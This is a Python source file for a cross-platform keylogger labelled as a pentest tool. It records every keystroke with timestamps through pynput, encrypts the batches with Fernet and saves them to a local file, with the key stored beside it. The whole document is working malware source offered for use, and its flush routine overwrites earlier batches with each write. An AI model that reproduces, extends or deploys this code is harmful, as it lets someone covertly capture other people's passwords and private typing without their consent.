#!/usr/bin/env python3
"""
Universal Keylogger - Cross-platform pentest tool
Windows/Linux/macOS compatible
"""
import logging
import json
import os
from datetime import datetime
import time
import signal
import sys
from pathlib import Path

try:
    from pynput import keyboard

    HAS_PYNPUT = True
except ImportError:
    print("❌ Install: pip install pynput cryptography")
    sys.exit(1)

from cryptography.fernet import Fernet


class UniversalKeylogger:
    def __init__(self):
        self.log_file = Path("keystrokes.enc")
        self.key_file = Path("key.key")
        self.key = self._get_key()
        self.cipher = Fernet(self.key)
        self.keystrokes = []
        self.running = True
        self.setup_logging()

    def _get_key(self):
        if self.key_file.exists():
            return self.key_file.read_bytes()
        key = Fernet.generate_key()
        self.key_file.write_bytes(key)
        return key

    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s %(message)s',
            handlers=[logging.StreamHandler()]
        )
        self.log = logging.getLogger("Keylogger")

    def on_press(self, key):
        try:
            ts = datetime.now().isoformat()
            if hasattr(key, 'char') and key.char:
                kdata = {'key': key.char, 'type': 'char', 'ts': ts}
            else:
                kdata = {'key': str(key), 'type': 'special', 'ts': ts}
            self.keystrokes.append(kdata)

            if len(self.keystrokes) >= 30:
                self.flush()
        except:
            pass

    def on_release(self, key):
        if key == keyboard.Key.esc:
            self.stop()
            return False

    def flush(self):
        if not self.keystrokes:
            return
        try:
            data = json.dumps(self.keystrokes).encode()
            enc_data = self.cipher.encrypt(data)
            self.log_file.write_bytes(enc_data + b'\n')
            self.keystrokes.clear()
        except:
            pass

    def stop(self):
        self.running = False
        self.flush()
        print("\n🛑 Keylogger stopped")
        sys.exit(0)

    def run(self):
        print("🔑 Keylogger ACTIVE (ESC to stop)")
        print("📁 Logs → keystrokes.enc")
        listener = keyboard.Listener(on_press=self.on_press, on_release=self.on_release)
        listener.start()

        try:
            while self.running:
                time.sleep(1)
        except KeyboardInterrupt:
            pass
        finally:
            listener.stop()
            self.flush()


if __name__ == "__main__":
    kl = UniversalKeylogger()
    kl.run()